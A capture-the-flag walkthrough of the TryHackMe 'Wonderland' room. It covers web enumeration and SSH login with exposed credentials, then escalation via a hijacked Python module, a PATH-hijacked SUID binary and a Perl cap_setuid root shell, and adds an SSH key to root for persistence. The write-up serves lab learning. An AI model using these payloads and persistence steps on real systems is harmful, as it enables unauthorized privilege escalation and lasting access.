# Wonderland Challenge
**Platform:** TryHackMe  
**Machine:** Wonderland  
**Difficulty:** Medium

<img width="1803" height="396" alt="image" src="https://github.com/user-attachments/assets/cca17186-cb57-474c-b1d7-4019d214d292" />

**Category:** Red Teaming

### Description
Fall down the rabbit hole and enter wonderland.

### Steps

### 1. Initial Reconnaissance (Port Scanning)

I took the machine IP and added it in the host file (/etc/hosts) 
```
MACHINE_IP  thm.thm
```

I started by scanning the target to identify open ports.

```
nmap -Pn thm.thm
```

The scan retrieved two open ports:

| Port | Service |
|---|---|
| 22 | SSH | 
| 80 | HTTP | 

<img width="1920" height="780" alt="image" src="https://github.com/user-attachments/assets/12c25fa4-ddf8-400d-8586-08330a6045a6" />

Since HTTP was available, I decided to investigate the web application first.

### 2. Web Enumeration (Directory and File Discovery)

I opened the website in the browser but I didn't find any interesting things .So, Started directory enumeration using FFUF to discover hidden paths.

```
ffuf -u http://thm.thm/FUZZ \
-w common.txt
```
Result:
```
r
```
then next:
```
ffuf -u http://thm.thm/r/FUZZ \
-w common.txt
```
Result:
```
a
```
and again until I discovered the following path:

```
/r/a/b/b/i/t
```

<img width="1425" height="834" alt="image" src="https://github.com/user-attachments/assets/ae71f957-77b3-46d0-a53c-d9bb34434cc9" />


###### Credential Discovery

I go to the discovered path and found credentials belonging to Alice in HTML code of the page (inspect):

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

<img width="1920" height="859" alt="image" src="https://github.com/user-attachments/assets/8e434bea-9ca1-430c-aeb4-ad3467de1bed" />

So let's use it for the SSH access.

### 3. Initial Access: Alice

Using the discovered credentials, I connected to the target over SSH:

```bash
ssh alice@thm.thm
```
And then put the password.

After successfully authenticating, I obtained an interactive shell as Alice.

<img width="1920" height="783" alt="image" src="https://github.com/user-attachments/assets/9f5410f5-197b-4128-92c4-bad9239b2e3c" />

### 4. Initial Enumeration

After obtaining the initial shell as alice, I started enumerating the system to identify potential privilege escalation opportunities.

###### Check the current user

```bash
id
whoami
```

###### Enumerate SSH configuration

```bash
ls -la /etc/ssh/
ls -la ~/.ssh/
```

The SSH host keys under /etc/ssh/ are used by the SSH server to identify itself. They are not automatically usable as user login credentials.

I tried it. But, it failed. 

##### Check sudo permissions

```
sudo -l
```

The output revealed that Alice could execute a Python script as Rabbit:

```
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

This was the first interesting privilege escalation opportunity.

### 5. Alice -> Rabbit: Python Module Hijacking

I inspected the Python script:

```
cat /home/alice/walrus_and_the_carpenter.py
```

The script imported the random module:

```python
import random

poem = """..."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

<img width="1920" height="853" alt="image" src="https://github.com/user-attachments/assets/cb812765-3de4-4080-9cf1-668f3b3734f2" />

###### Vulnerability: Python Module Hijacking

When Python executes a script, its script directory is included in the module search path.

Python searches directories for imported modules. If a malicious module with the same name exists in a directory searched before the legitimate standard library module, Python may load the malicious one.

In this case, the script directory was:

```text
/home/alice/
```

Therefore, creating a malicious 'random.py' in that directory could cause the script to import our file instead of the legitimate Python module.

### Exploitation

I created the malicious module:

```
nano /home/alice/random.py
```

Payload:

```
import os

os.setuid(os.geteuid())
os.system("/bin/bash")
```

I then executed the script using the permitted sudo command:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Result

I verified the new privileges:

```
id
```

The shell was running as:

```
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

**Alice → Rabbit successful.**

<img width="1920" height="207" alt="image" src="https://github.com/user-attachments/assets/3bff16a2-f60c-4f5b-a1c5-064fd9d4559a" />

### 6. Rabbit -> Hatter: PATH Hijacking

### Enumeration

After obtaining Rabbit's shell, I searched for interesting files and binaries.

I found:

```bash
/home/rabbit/teaParty
```

I inspected the binary:

```
file /home/rabbit/teaParty
```
<img width="1253" height="340" alt="image" src="https://github.com/user-attachments/assets/dc31dc6c-ebd0-4d66-8eab-c5be4a2e70cc" />

It was identified as a 64-bit ELF executable with SUID and SGID permissions.

### Understanding the vulnerability

A SUID executable runs with the effective privileges of its file owner.

I investigated the commands executed by the binary using:

```
strace -f -e execve /home/rabbit/teaParty
```

The output showed that the binary executed a shell command that eventually called:

```
/bin/date --date=next hour -R
```

<img width="1920" height="413" alt="image" src="https://github.com/user-attachments/assets/5eba5d15-8b8e-40e6-8b35-f211defd7366" />

The important detail was that date was called without an absolute path.

This means the shell searches for the executable using the directories listed in the `PATH` environment variable.

### Exploitation

I created a malicious executable named `date` in `/tmp`:

```bash
nano /tmp/date
```

Payload:

```bash
#!/bin/bash
/bin/bash -p
```

I made it executable:

```bash
chmod +x /tmp/date
```

Then I placed `/tmp` at the beginning of my PATH:

```bash
export PATH=/tmp:$PATH
```
<img width="1226" height="124" alt="image" src="https://github.com/user-attachments/assets/92b33455-ef1b-4dbd-8a35-4719ef96ac45" />

But don't forget to change chmod to be excuteable.

When the SUID binary attempted to execute `date`, the shell found `/tmp/date` before the legitimate system executable.

I executed:

```bash
/home/rabbit/teaParty
```

The malicious script launched a privileged Bash shell.

###### Result

I verified the account:

```bash
id
```

Output:

```text
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

**Rabbit -> Hatter successful.**

I found password.txt So, I used it to access hatter ssh

<img width="1248" height="600" alt="image" src="https://github.com/user-attachments/assets/6b4f6955-7478-4d79-93a4-32953d1c71c8" />

```
ssh hatter@thm.thm
```
<img width="1920" height="791" alt="image" src="https://github.com/user-attachments/assets/e7d69b7c-ed76-4161-808a-a646de558bba" />

### 7. Hatter -> Root: Linux Capabilities Abuse

### Enumeration

As Hatter, I enumerated Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

The output included:

```text
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

### Understanding Linux Capabilities

Linux capabilities divide traditional root privileges into smaller individual privileges.

The `CAP_SETUID` capability allows a process to change its user ID using system calls such as `setuid()`.

The notation:

```text
cap_setuid+ep
```

means:

- `cap_setuid`: The capability is CAP_SETUID.
- `e`: Effective capability set.
- `p`: Permitted capability set.

Since Perl had this capability, it could change its process UID to root.

##### Exploitation

I used Perl to change the UID to `0` and launch Bash:

```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```
you can use this [website](https://gtfobins.org/) for taking the previous script by searching with perl

##### Result
I verified the privileges:

```
id
```

Output:

```text
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

This confirmed that I had obtained root privileges.

To get user flag:
```
find -type f -name user.txt
cat /root/user.txt
```
<img width="1232" height="332" alt="image" src="https://github.com/user-attachments/assets/9cbc6310-fb69-48e1-8f59-f862bf8b0aa9" />

To obtain a shell with both root UID and root GID:

### Establishing Persistent Root SSH Access

I generated an RSA key pair on the machine:

```
ssh-keygen -t rsa -b 4096 -f root_sc
```

This generated two files:

- `root_sc`: Private key.
- `root_sc.pub`: Public key.

<img width="1331" height="586" alt="image" src="https://github.com/user-attachments/assets/89455ab1-6d54-458f-ba2d-caebdea038b5" />

Since I already had root privileges on the target, I created the SSH directory:

```bash
cd /root/.ssh
chmod 700 /root/.ssh
```

I added the generated public key to root's authorized keys and copy/paste the private key in this directory:

```bash
nano /root/.ssh/authorized_keys
nano root_sc --> # paste here the privat key to use it for access ssh
```

<img width="1249" height="699" alt="image" src="https://github.com/user-attachments/assets/6c52fab8-1162-470b-9171-14a4dc5d0281" />


I configured the correct permissions and ownership:

```bash
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh
```

Finally, I connected using the generated private key:

```bash
ssh -i wonderland_root root@wonderland
```

I verified the new session:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed successful root SSH authentication using my generated RSA key pair.

To get root flag
```
find -type f -name root.txt
cat /home/alice/root.txt
```

Alhamdulillah, The room was solved successfully!

----

[The room link](https://tryhackme.com/room/wonderland)

See you in the next writeup, In sha' Allah!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
